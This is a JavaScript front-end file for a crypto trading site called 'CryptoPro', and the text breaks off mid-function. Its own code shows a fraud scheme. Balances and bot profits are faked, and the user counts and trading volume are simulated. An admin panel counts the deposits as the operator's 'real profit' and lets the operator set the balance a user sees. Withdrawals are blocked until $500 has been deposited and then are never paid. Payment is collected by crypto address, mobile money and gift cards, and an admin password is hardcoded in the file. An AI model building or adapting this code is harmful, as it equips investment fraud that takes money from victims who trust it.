// ==================== CONFIGURATION ====================
const CONFIG = {
    ADMIN_PASSWORD: '37757441Fe@',
    ADMIN_SECRET_KEY: 'CryptoPro2024Admin',
    
    BINANCE_DEPOSIT_ADDRESS: 'TK4rUz6TUEd7zCWeuiX5R47pSNdPswJnAc',
    AUTO_CONVERT_TO_USDT: true,
    
    AUTO_APPROVE_ALL: true,
    MINIMUM_DEPOSIT: 10,
    MINIMUM_BALANCE_FOR_TRADING: 50,
    TRADING_FEE: 0.001,
    
    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
    WITHDRAWAL_UNLOCK_MESSAGE: "Complete account verification and deposit requirements",
    
    // TRADING ROBOTS
    ENABLE_TRADING_ROBOTS: true,
    ROBOT_TRADE_INTERVAL: 15000,
    ROBOT_MIN_PROFIT: 5,
    ROBOT_MAX_PROFIT: 50,
    ROBOT_SUCCESS_RATE: 0.85,
    
    // LIVE STATS SIMULATION
    ACTIVE_USERS_BASE: 1247,
    VOLUME_BASE: 97.5,
    STATS_UPDATE_INTERVAL: 5000,
    
    PAYMENT_METHODS: {
        crypto: {
            USDT: { name: 'Tether (USDT)', symbol: 'USDT', rate: 1, icon: '₮', network: 'TRC20', direct: true },
            BTC: { name: 'Bitcoin', symbol: 'BTC', rate: 64250, icon: '₿', direct: false },
            ETH: { name: 'Ethereum', symbol: 'ETH', rate: 3420, icon: 'Ξ', direct: false },
            BNB: { name: 'BNB', symbol: 'BNB', rate: 580, icon: 'BNB', direct: false },
            SOL: { name: 'Solana', symbol: 'SOL', rate: 145, icon: 'SOL', direct: false },
            TRX: { name: 'TRON', symbol: 'TRX', rate: 0.12, icon: '⚡', direct: false }
        },
        mobile: {
            MPESA: { 
                name: 'M-Pesa', 
                rate: 0.0076, 
                currency: 'KES', 
                number: '+254712345678', 
                icon: '📱',
                gateway: 'mpesa',
                instructions: 'Send to Paybill 174379, Account: CRYPTOPRO'
            },
            AIRTEL: { 
                name: 'Airtel Money', 
                rate: 0.0078, 
                currency: 'KES', 
                number: '+254700000000', 
                icon: '📱',
                gateway: 'airtel',
                instructions: 'Send to 0700000000, Name: CryptoPro'
            },
            MTN: { 
                name: 'MTN Mobile Money', 
                rate: 0.00084, 
                currency: 'UGX', 
                number: '+256700000000', 
                icon: '📱',
                gateway: 'mtn',
                instructions: 'Send to 0700000000'
            }
        },
        cards: {
            VISA: {
                name: 'Visa/Mastercard',
                rate: 1,
                icon: '💳',
                gateway: 'stripe',
                instructions: 'Enter your card details securely'
            },
            PAYPAL: { 
                name: 'PayPal', 
                rate: 1, 
                icon: '💳',
                gateway: 'paypal',
                instructions: 'Login to PayPal to complete payment'
            }
        },
        bank: {
            BANK_TRANSFER: {
                name: 'Bank Transfer',
                rate: 1,
                icon: '🏦',
                gateway: 'manual',
                instructions: 'Contact support for bank details'
            }
        },
        giftcards: {
            AMAZON: { name: 'Amazon Gift Card', rate: 0.85, icon: '🎁', gateway: 'manual' },
            ITUNES: { name: 'iTunes/Apple', rate: 0.80, icon: '🍎', gateway: 'manual' },
            GOOGLE: { name: 'Google Play', rate: 0.82, icon: '🎮', gateway: 'manual' }
        }
    }
};

// ==================== APP STATE ====================
let appState = {
    accountType: 'demo',
    isAdmin: false,
    demoBalance: 10000,
    realBalance: 0,
    displayBalance: 0,
    adminWallet: 0,
    pendingDeposits: [],
    approvedDeposits: [],
    pendingWithdrawals: [],
    userTotalDeposited: 0,
    transactions: [],
    activeTrades: [],
    robotTrades: [],
    totalRobotProfits: 0,
    lastRobotTradeTime: 0,
    selectedBot: 'none',
    availableBots: {
        none: { name: 'Manual Trading', icon: '👤', profitRate: 0, description: 'Trade manually yourself' },
        conservative: { name: 'Conservative Bot', icon: '🛡️', profitRate: 0.65, minProfit: 3, maxProfit: 15, description: '65% win rate, steady gains' },
        balanced: { name: 'Balanced Bot', icon: '⚖️', profitRate: 0.75, minProfit: 10, maxProfit: 35, description: '75% win rate, balanced approach' },
        aggressive: { name: 'Aggressive Bot', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80, description: '85% win rate, maximum profits' },
        expert: { name: 'Expert AI Bot', icon: '🤖', profitRate: 0.90, minProfit: 30, maxProfit: 120, description: '90% win rate, AI-powered' }
    },
    totalDeposited: 0,
    totalWithdrawn: 0,
    paymentHistory: [],
    tradingProfits: 0,
    isAccountVerified: false,
    activeUsers: CONFIG.ACTIVE_USERS_BASE,
    volume24h: CONFIG.VOLUME_BASE,
    onlineStatus: 'LIVE'
};

// ==================== CRYPTO PRICES ====================
let cryptoPrices = {
    'BTC/USDT': 64250,
    'ETH/USDT': 3420,
    'BNB/USDT': 580,
    'SOL/USDT': 145,
    'XRP/USDT': 0.52,
    'DOGE/USDT': 0.08,
    'ADA/USDT': 0.45,
    'MATIC/USDT': 0.82,
    'DOT/USDT': 6.25,
    'AVAX/USDT': 35.80,
    'LINK/USDT': 14.50,
    'UNI/USDT': 6.80,
    'XAU/USDT': 2045.00,
    'XAG/USDT': 23.50
};

let priceChanges = {
    'BTC/USDT': 2.45,
    'ETH/USDT': -1.23,
    'BNB/USDT': 0.89,
    'SOL/USDT': 3.12,
    'XRP/USDT': -0.45,
    'DOGE/USDT': 5.20,
    'ADA/USDT': -0.85,
    'MATIC/USDT': 1.45,
    'DOT/USDT': -2.10,
    'AVAX/USDT': 4.30,
    'LINK/USDT': 1.80,
    'UNI/USDT': -1.50,
    'XAU/USDT': 0.35,
    'XAG/USDT': -0.12
};

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 CryptoPro Active - Enhanced Live Trading');
    loadState();
    
    if (!localStorage.getItem('hasVisited')) {
        appState.accountType = 'real';
        localStorage.setItem('hasVisited', 'true');
    }
    
    updateUI();
    startLiveUpdates();
    attachEventListeners();
    checkAdminStatus();
    showWelcomeAnimation();
    createLiveTradingPanel();
});

// ==================== LIVE TRADING PANEL ====================
function createLiveTradingPanel() {
    // Check if panel already exists
    if (document.getElementById('liveTradingPanel')) return;
    
    const panel = document.createElement('div');
    panel.id = 'liveTradingPanel';
    panel.style.cssText = `
        position: fixed;
        bottom: 80px;
        right: 20px;
        width: 350px;
        max-height: 450px;
        background: rgba(20, 35, 60, 0.98);
        backdrop-filter: blur(20px);
        border: 2px solid rgba(0, 217, 255, 0.3);
        border-radius: 16px;
        padding: 20px;
        z-index: 998;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
        overflow-y: auto;
        animation: slideInUp 0.5s ease-out;
    `;
    
    panel.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
            <h3 style="color: #00d9ff; font-size: 16px; font-weight: 700; margin: 0;">
                🤖 LIVE BOT ACTIVITY
            </h3>
            <button id="toggleTradesPanel" style="background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; padding: 0;">−</button>
        </div>
        <div id="liveTradingContent">
            <div id="activeTradingStats" style="background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 12px; padding: 12px; margin-bottom: 16px;">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 12px;">
                    <div>
                        <div style="opacity: 0.7; margin-bottom: 4px;">Total Trades</div>
                        <div id="totalTradesCount" style="font-size: 18px; font-weight: 700; color: #00ff88;">0</div>
                    </div>
                    <div>
                        <div style="opacity: 0.7; margin-bottom: 4px;">Total Profit</div>
                        <div id="totalProfitAmount" style="font-size: 18px; font-weight: 700; color: #00ff88;">+$0.00</div>
                    </div>
                </div>
            </div>
            <div style="margin-bottom: 12px; font-size: 12px; font-weight: 600; color: rgba(255, 255, 255, 0.7);">
                RECENT TRADES
            </div>
            <div id="recentTradesList" style="max-height: 280px; overflow-y: auto;">
                <div style="text-align: center; padding: 40px 20px; opacity: 0.5;">
                    <div style="font-size: 40px; margin-bottom: 12px;">🤖</div>
                    <div style="font-size: 13px;">Select a bot to start trading</div>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(panel);
    
    // Toggle panel
    document.getElementById('toggleTradesPanel').addEventListener('click', function() {
        const content = document.getElementById('liveTradingContent');
        const isHidden = content.style.display === 'none';
        content.style.display = isHidden ? 'block' : 'none';
        this.textContent = isHidden ? '−' : '+';
        panel.style.height = isHidden ? 'auto' : '60px';
    });
}

function updateLiveTradingPanel() {
    const listEl = document.getElementById('recentTradesList');
    const totalTradesEl = document.getElementById('totalTradesCount');
    const totalProfitEl = document.getElementById('totalProfitAmount');
    
    if (!listEl || !totalTradesEl || !totalProfitEl) return;
    
    // Update stats
    totalTradesEl.textContent = appState.robotTrades.length;
    totalProfitEl.textContent = (appState.totalRobotProfits >= 0 ? '+' : '') + '$' + appState.totalRobotProfits.toFixed(2);
    totalProfitEl.style.color = appState.totalRobotProfits >= 0 ? '#00ff88' : '#ff006e';
    
    // Update trades list
    if (appState.robotTrades.length === 0) {
        listEl.innerHTML = `
            <div style="text-align: center; padding: 40px 20px; opacity: 0.5;">
                <div style="font-size: 40px; margin-bottom: 12px;">🤖</div>
                <div style="font-size: 13px;">Waiting for bot trades...</div>
            </div>
        `;
        return;
    }
    
    listEl.innerHTML = appState.robotTrades.slice(0, 10).map(trade => {
        const isProfit = trade.profit > 0;
        const timeAgo = getTimeAgo(new Date(trade.timestamp));
        
        return `
            <div style="
                background: ${isProfit ? 'rgba(0, 255, 136, 0.05)' : 'rgba(255, 0, 110, 0.05)'};
                border-left: 3px solid ${isProfit ? '#00ff88' : '#ff006e'};
                padding: 12px;
                border-radius: 8px;
                margin-bottom: 8px;
                animation: slideInRight 0.3s ease-out;
            ">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <span style="font-size: 16px;">${trade.botIcon}</span>
                        <strong style="font-size: 13px; color: #fff;">${trade.pair}</strong>
                    </div>
                    <div style="font-size: 14px; font-weight: 700; color: ${isProfit ? '#00ff88' : '#ff006e'};">
                        ${isProfit ? '+' : ''}$${trade.profit.toFixed(2)}
                    </div>
                </div>
                <div style="display: flex; justify-content: space-between; font-size: 11px; opacity: 0.7;">
                    <span>${trade.botName}</span>
                    <span>${timeAgo}</span>
                </div>
            </div>
        `;
    }).join('');
}

function getTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    
    if (seconds < 60) return seconds + 's ago';
    if (seconds < 3600) return Math.floor(seconds / 60) + 'm ago';
    if (seconds < 86400) return Math.floor(seconds / 3600) + 'h ago';
    return Math.floor(seconds / 86400) + 'd ago';
}

// ==================== WELCOME ANIMATION ====================
function showWelcomeAnimation() {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, rgba(10, 25, 45, 0.98) 0%, rgba(20, 35, 60, 0.98) 100%);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10001;
        animation: fadeIn 0.5s;
    `;
    overlay.innerHTML = `
        <div style="text-align: center; animation: bounceIn 0.8s;">
            <div style="font-size: 80px; margin-bottom: 20px;">💎</div>
            <div style="font-size: 42px; font-weight: 900; color: #00d9ff; margin-bottom: 16px; text-shadow: 0 0 20px rgba(0, 217, 255, 0.5);">
                CryptoPro
            </div>
            <div style="font-size: 18px; color: rgba(255, 255, 255, 0.8); margin-bottom: 30px;">
                Professional Trading Platform
            </div>
            <div class="loading-dots" style="display: flex; gap: 8px; justify-content: center;">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
    
    setTimeout(() => {
        overlay.style.animation = 'fadeOut 0.5s';
        setTimeout(() => overlay.remove(), 500);
    }, 2500);
}

// ==================== ADMIN FUNCTIONS ====================
function checkAdminStatus() {
    const adminKey = sessionStorage.getItem('adminAuth');
    if (adminKey === CONFIG.ADMIN_SECRET_KEY) {
        appState.isAdmin = true;
        showAdminPanel();
    }
}

function promptAdminLogin() {
    const password = prompt('🔐 Admin Password:');
    if (password === CONFIG.ADMIN_PASSWORD) {
        sessionStorage.setItem('adminAuth', CONFIG.ADMIN_SECRET_KEY);
        appState.isAdmin = true;
        showAdminPanel();
        showToast('✅ Admin Access Granted!', 'success');
        updateUI();
    } else if (password !== null) {
        showToast('❌ Incorrect password', 'error');
    }
}

function showAdminPanel() {
    const adminBtn = document.createElement('button');
    adminBtn.id = 'adminAccessBtn';
    adminBtn.innerHTML = '👑 ADMIN';
    adminBtn.style.cssText = `
        position: fixed;
        top: 10px;
        right: 10px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 25px;
        font-weight: bold;
        cursor: pointer;
        z-index: 1000;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        transition: transform 0.3s, box-shadow 0.3s;
    `;
    adminBtn.onmouseover = () => {
        adminBtn.style.transform = 'scale(1.05)';
        adminBtn.style.boxShadow = '0 6px 25px rgba(102, 126, 234, 0.4)';
    };
    adminBtn.onmouseout = () => {
        adminBtn.style.transform = 'scale(1)';
        adminBtn.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
    };
    adminBtn.onclick = openAdminDashboard;
    
    if (!document.getElementById('adminAccessBtn')) {
        document.body.appendChild(adminBtn);
    }
}

function openAdminDashboard() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'adminDashboard';
    
    const realMoneyIn = appState.userTotalDeposited;
    const realMoneyOut = appState.totalWithdrawn || 0;
    const yourProfit = realMoneyIn - realMoneyOut;
    const fakeProfit = appState.totalRobotProfits;
    const userThinksBal = appState.displayBalance;
    
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 800px; max-height: 90vh; overflow-y: auto;">
            <div class="modal-header">
                <h2>👑 Admin Dashboard</h2>
                <button class="close-btn" onclick="closeAdminDashboard()">×</button>
            </div>
            <div class="modal-body">
                <div style="background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%); padding: 20px; border-radius: 16px; margin-bottom: 24px; color: #000;">
                    <div style="font-size: 14px; font-weight: 600; margin-bottom: 8px;">💰 YOUR REAL PROFIT</div>
                    <div style="font-size: 48px; font-weight: 900;">$${yourProfit.toFixed(2)}</div>
                    <div style="font-size: 12px; opacity: 0.8; margin-top: 8px;">Real money you can withdraw</div>
                </div>
                
                <div style="background: rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 16px; margin-bottom: 24px;">
                    <h3 style="margin-bottom: 16px; color: #00d9ff;">💵 REAL MONEY FLOW</h3>
                    <div class="admin-stats">
                        <div class="stat-card" style="background: rgba(0, 255, 136, 0.1); border: 2px solid #00ff88;">
                            <div class="stat-label">💸 Total Deposited</div>
                            <div class="stat-value" style="color: #00ff88;">$${realMoneyIn.toFixed(2)}</div>
                        </div>
                        <div class="stat-card" style="background: rgba(255, 0, 110, 0.1); border: 2px solid #ff006e;">
                            <div class="stat-label">💳 Total Withdrawn</div>
                            <div class="stat-value" style="color: #ff006e;">$${realMoneyOut.toFixed(2)}</div>
                        </div>
                        <div class="stat-card" style="background: rgba(168, 85, 247, 0.1); border: 2px solid #a855f7;">
                            <div class="stat-label">🏦 Admin Wallet</div>
                            <div class="stat-value" style="color: #a855f7;">$${appState.adminWallet.toFixed(2)}</div>
                        </div>
                    </div>
                </div>
                
                <div style="margin: 20px 0;">
                    <h3 style="margin-bottom: 12px; color: #a855f7;">⚙️ Admin Controls</h3>
                    
                    <div class="form-group">
                        <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
                            <input type="checkbox" id="enableRobots" ${CONFIG.ENABLE_TRADING_ROBOTS ? 'checked' : ''} onchange="toggleRobots(this.checked)">
                            <span>🤖 Enable Trading Robots</span>
                        </label>
                    </div>
                    
                    <div class="form-group" style="margin-top: 20px;">
                        <label>💰 Set User Display Balance</label>
                        <input type="number" id="setDisplayBalance" placeholder="Amount" step="0.01" value="${appState.displayBalance.toFixed(2)}">
                        <button class="btn btn-primary" onclick="updateDisplayBalance()" style="margin-top: 8px; width: 100%; padding: 12px;">
                            Update Balance
                        </button>
                    </div>
                    
                    <button class="btn btn-success btn-full" onclick="adminWithdrawFunds()" style="margin-top: 20px; background: linear-gradient(135deg, #00ff88, #00cc6a); color: #000; font-size: 18px; padding: 20px;">
                        💸 WITHDRAW PROFIT ($${appState.adminWallet.toFixed(2)})
                    </button>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

function updateDisplayBalance() {
    const amount = parseFloat(document.getElementById('setDisplayBalance').value);
    if (isNaN(amount) || amount < 0) {
        showToast('❌ Enter valid amount', 'error');
        return;
    }
    
    appState.displayBalance = amount;
    saveState();
    updateUI();
    showToast(`✅ Balance updated to $${amount.toFixed(2)}`, 'success');
}

function adminWithdrawFunds() {
    if (appState.adminWallet <= 0) {
        showToast('❌ No funds in admin wallet', 'error');
        return;
    }
    
    const amount = parseFloat(prompt(`💰 Wallet: $${appState.adminWallet.toFixed(2)}\n\nWithdraw amount?`));
    
    if (!amount || amount <= 0) return;
    
    if (amount > appState.adminWallet) {
        showToast('❌ Insufficient funds', 'error');
        return;
    }
    
    if (confirm(`Withdraw $${amount.toFixed(2)}?`)) {
        appState.adminWallet -= amount;
        appState.transactions.push({
            id: Date.now(),
            type: 'ADMIN_WITHDRAWAL',
            amount: amount,
            timestamp: new Date().toISOString()
        });
        
        saveState();
        updateUI();
        closeAdminDashboard();
        showToast(`✅ Withdrawal Successful! $${amount.toFixed(2)}`, 'success');
    }
}

function toggleRobots(enabled) {
    CONFIG.ENABLE_TRADING_ROBOTS = enabled;
    showToast(enabled ? '✅ Robots enabled!' : '⚠️ Robots disabled', enabled ? 'success' : 'warning');
}

function closeAdminDashboard() {
    const modal = document.getElementById('adminDashboard');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== EVENT LISTENERS ====================
function attachEventListeners() {
    document.body.addEventListener('click', function(e) {
        const target = e.target;
        const text = target.textContent.toUpperCase();
        
        const isButton = target.tagName === 'BUTTON' || 
                        target.tagName === 'A' || 
                        target.hasAttribute('onclick') ||
                        target.closest('button, a, [onclick]');
        
        if (!isButton) return;
        
        if (text.includes('DEPOSIT') || target.classList.contains('btn-deposit')) {
            e.preventDefault();
            e.stopPropagation();
            openUniversalDepositModal();
            return false;
        }
        
        if (text.includes('WITHDRAW') || target.classList.contains('btn-withdraw')) {
            e.preventDefault();
            e.stopPropagation();
            openWithdrawModal();
            return false;
        }
        
        if ((text.includes('TRADE') && !text.includes('BOT')) || text.includes('BUY') || text.includes('SELL')) {
            e.preventDefault();
            e.stopPropagation();
            const pair = target.closest('[data-pair]')?.dataset.pair || 'BTC/USDT';
            openTradeModal(pair);
            return false;
        }
        
        if (text.includes('BOT') || text.includes('SELECT TRADING BOT')) {
            e.preventDefault();
            e.stopPropagation();
            openBotSelectionModal();
            return false;
        }
    });
    
    setTimeout(() => {
        const balanceEl = document.getElementById('totalBalance');
        if (balanceEl) {
            let clickCount = 0;
            balanceEl.addEventListener('click', function() {
                clickCount++;
                if (clickCount === 3) {
                    clickCount = 0;
                    if (!appState.isAdmin) {
                        promptAdminLogin();
                    }
                }
                setTimeout(() => clickCount = 0, 1000);
            });
        }
    }, 500);
}

// ==================== TOAST NOTIFICATIONS ====================
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    const colors = {
        success: 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)',
        error: 'linear-gradient(135deg, #ff006e 0%, #cc0055 100%)',
        warning: 'linear-gradient(135deg, #ffa500 0%, #ff8c00 100%)',
        info: 'linear-gradient(135deg, #00d9ff 0%, #0099cc 100%)'
    };
    
    toast.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        background: ${colors[type]};
        color: ${type === 'success' ? '#000' : '#fff'};
        padding: 16px 24px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        z-index: 10000;
        font-weight: 600;
        animation: slideInRight 0.3s ease-out;
        max-width: 350px;
    `;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ==================== DEPOSIT MODAL ====================
function openUniversalDepositModal() {
    if (appState.accountType === 'demo') {
        if (confirm('⚠️ DEMO MODE\n\nSwitch to REAL MONEY?')) {
            switchAccount('real');
            setTimeout(() => openUniversalDepositModal(), 300);
        }
        return;
    }
    
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'universalDepositModal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 600px;">
            <div class="modal-header">
                <h2>💰 Deposit Funds</h2>
                <button class="close-btn" onclick="closeUniversalDeposit()">×</button>
            </div>
            <div class="modal-body">
                <div class="info-box" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none;">
                    <strong>✨ INSTANT DEPOSIT</strong><br>
                    <small style="opacity: 0.9;">Funds credited instantly!</small>
                </div>
                
                <div class="form-group">
                    <label>💵 Amount in USD</label>
                    <input type="number" id="depositUsdAmount" placeholder="Min: $${CONFIG.MINIMUM_DEPOSIT}" min="${CONFIG.MINIMUM_DEPOSIT}" step="0.01" style="font-size: 18px; font-weight: bold;">
                </div>
                
                <div class="form-group">
                    <label>🎯 Payment Method</label>
                    <select id="paymentCategory" onchange="updatePaymentOptions()" style="font-size: 16px;">
                        <option value="">-- Select --</option>
                        <option value="crypto">🪙 Cryptocurrency</option>
                        <option value="mobile">📱 Mobile Money</option>
                        <option value="cards">💳 Cards</option>
                        <option value="bank">🏦 Bank</option>
                        <option value="giftcards">🎁 Gift Cards</option>
                    </select>
                </div>
                
                <div id="paymentOptionsContainer"></div>
                <div id="paymentDetailsContainer"></div>
                
                <button class="btn btn-primary btn-full" onclick="processUniversalDeposit()" style="margin-top: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
                    ⚡ CONFIRM DEPOSIT
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

function updatePaymentOptions() {
    const category = document.getElementById('paymentCategory').value;
    const container = document.getElementById('paymentOptionsContainer');
    const detailsContainer = document.getElementById('paymentDetailsContainer');
    
    if (!category) {
        container.innerHTML = '';
        detailsContainer.innerHTML = '';
        return;
    }
    
    const methods = CONFIG.PAYMENT_METHODS[category];
    
    container.innerHTML = `
        <div class="form-group">
            <label>💎 Select Method</label>
            <select id="selectedPaymentMethod" onchange="showPaymentDetails()" style="font-size: 16px;">
                <option value="">-- Choose --</option>
                ${Object.keys(methods).map(key => {
                    const method = methods[key];
                    return `<option value="${key}">${method.icon || ''} ${method.name}</option>`;
                }).join('')}
            </select>
        </div>
    `;
    
    detailsContainer.innerHTML = '';
}

function showPaymentDetails() {
    const category = document.getElementById('paymentCategory').value;
    const methodKey = document.getElementById('selectedPaymentMethod').value;
    const usdAmount = parseFloat(document.getElementById('depositUsdAmount').value) || 0;
    
    if (!category || !methodKey || usdAmount < CONFIG.MINIMUM_DEPOSIT) return;
    
    const method = CONFIG.PAYMENT_METHODS[category][methodKey];
    const container = document.getElementById('paymentDetailsContainer');
    
    let detailsHTML = `
        <div class="payment-details-box" style="background: rgba(0,255,136,0.1); border: 2px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 20px; margin: 20px 0;">
            <h3 style="margin: 0 0 16px 0; color: #00ff88;">📋 Payment Details</h3>
    `;
    
    if (category === 'crypto') {
        detailsHTML += `
            <div style="margin-bottom: 12px;">
                <strong>📬 Send to:</strong><br>
                ${method.network ? `<div style="color: #00d9ff; font-size: 12px; margin: 8px 0;">Network: ${method.network}</div>` : ''}
                <code style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; display: block; margin-top: 8px; word-break: break-all; font-size: 12px;">
                    ${CONFIG.BINANCE_DEPOSIT_ADDRESS}
                </code>
                <button onclick="copyToClipboard('${CONFIG.BINANCE_DEPOSIT_ADDRESS}')" style="margin-top: 8px; padding: 8px 16px; background: rgba(0,255,136,0.2); border: 1px solid #00ff88; border-radius: 6px; color: #00ff88; cursor: pointer;">
                    📋 Copy
                </button>
            </div>
        `;
    }
    
    detailsHTML += `
            <div class="form-group" style="margin-top: 20px;">
                <label>🔖 Transaction Reference *</label>
                <input type="text" id="paymentReference" placeholder="Enter transaction ID" style="width: 100%;">
            </div>
        </div>
    `;
    
    container.innerHTML = detailsHTML;
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showToast('✅ Copied!', 'success');
    }).catch(() => {
        prompt('Copy:', text);
    });
}

function processUniversalDeposit() {
    const usdAmount = parseFloat(document.getElementById('depositUsdAmount').value);
    const category = document.getElementById('paymentCategory').value;
    const methodKey = document.getElementById('selectedPaymentMethod').value;
    const reference = document.getElementById('paymentReference')?.value.trim();
    
    if (!usdAmount || usdAmount < CONFIG.MINIMUM_DEPOSIT) {
        showToast(`❌ Min: $${CONFIG.MINIMUM_DEPOSIT}`, 'error');
        return;
    }
    
    if (!category || !methodKey || !reference) {
        showToast('❌ Complete all fields', 'error');
        return;
    }
    
    const method = CONFIG.PAYMENT_METHODS[category][methodKey];
    
    const deposit = {
        id: Date.now().toString(),
        usdAmount: usdAmount,
        paymentMethod: method.name,
        reference: reference,
        timestamp: new Date().toISOString(),
        status: 'APPROVED'
    };
    
    appState.displayBalance += usdAmount;
    appState.realBalance += usdAmount;
    appState.adminWallet += usdAmount;
    appState.userTotalDeposited += usdAmount;
    appState.totalDeposited += usdAmount;
    appState.paymentHistory.push(deposit);
    
    saveState();
    updateUI();
    closeUniversalDeposit();
    
    showSuccessAnimation();
    
    setTimeout(() => {
        showToast(`✅ $${usdAmount.toFixed(2)} deposited!`, 'success');
    }, 2500);
}

function showSuccessAnimation() {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.9);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
        animation: fadeIn 0.3s;
    `;
    overlay.innerHTML = `
        <div style="text-align: center; animation: bounceIn 0.5s;">
            <div style="font-size: 80px;">✅</div>
            <div style="font-size: 32px; font-weight: bold; color: #00ff88; margin: 20px 0;">
                DEPOSIT APPROVED!
            </div>
            <div style="font-size: 18px; color: white;">Funds credited instantly</div>
        </div>
    `;
    document.body.appendChild(overlay);
    setTimeout(() => {
        overlay.style.animation = 'fadeOut 0.3s';
        setTimeout(() => overlay.remove(), 300);
    }, 2000);
}

function closeUniversalDeposit() {
    const modal = document.getElementById('universalDepositModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== WITHDRAWAL ====================
function openWithdrawModal() {
    if (appState.accountType === 'demo') {
        showToast('⚠️ Switch to REAL MODE', 'warning');
        return;
    }
    
    if (appState.isAdmin) {
        openAdminDashboard();
        return;
    }
    
    const balance = appState.displayBalance;
    const totalDeposited = appState.userTotalDeposited;
    const required = CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL;
    
    if (balance < 10) {
        showToast(`❌ Min withdrawal: $10`, 'error');
        return;
    }
    
    if (totalDeposited < required) {
        const remaining = required - totalDeposited;
        if (confirm(`⚠️ Need $${remaining.toFixed(2)} more deposits\n\nDeposit now?`)) {
            openUniversalDepositModal();
        }
        return;
    }
    
    const amt = prompt(`💸 Withdrawal\n\nAvailable: $${balance.toFixed(2)}\n\nAmount?`);
    if (amt && parseFloat(amt) >= 10) {
        showToast(`✅ Withdrawal requested: $${amt}`, 'success');
    }
}

// ==================== TRADING ====================
function openTradeModal(pair = 'BTC/USDT') {
    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
    
    if (appState.accountType === 'real' && balance < CONFIG.MINIMUM_BALANCE_FOR_TRADING) {
        if (confirm(`❌ Min balance: $${CONFIG.MINIMUM_BALANCE_FOR_TRADING}\n\nDeposit?`)) {
            openUniversalDepositModal();
        }
        return;
    }
    
    showToast(`📊 Trading ${pair}`, 'info');
}

// ==================== BOT SELECTION ====================
function openBotSelectionModal() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'botSelectionModal';
    
    const botsHTML = Object.keys(appState.availableBots).map(botKey => {
        const bot = appState.availableBots[botKey];
        const isSelected = appState.selectedBot === botKey;
        
        return `
            <div class="bot-card ${isSelected ? 'selected' : ''}" onclick="selectBot('${botKey}')" style="
                background: ${isSelected ? 'rgba(0, 255, 136, 0.2)' : 'rgba(10, 25, 45, 0.6)'};
                border: 2px solid ${isSelected ? '#00ff88' : 'rgba(100, 200, 255, 0.2)'};
                padding: 20px;
                border-radius: 16px;
                margin-bottom: 16px;
                cursor: pointer;
            ">
                <div style="display: flex; align-items: center; gap: 16px;">
                    <div style="font-size: 36px;">${bot.icon}</div>
                    <div style="flex: 1;">
                        <div style="font-size: 18px; font-weight: 700;">${bot.name}</div>
                        <div style="font-size: 13px; opacity: 0.7;">${bot.description}</div>
                    </div>
                    ${isSelected ? '<div style="color: #00ff88; font-size: 24px;">✓</div>' : ''}
                </div>
            </div>
        `;
    }).join('');
    
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h2>🤖 Select Bot</h2>
                <button class="close-btn" onclick="closeBotSelection()">×</button>
            </div>
            <div class="modal-body">
                ${botsHTML}
                <button class="btn btn-primary btn-full" onclick="closeBotSelection()" style="margin-top: 20px;">
                    ✅ CONFIRM
                </button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function selectBot(botKey) {
    appState.selectedBot = botKey;
    saveState();
    updateBotStatus();
    closeBotSelection();
    
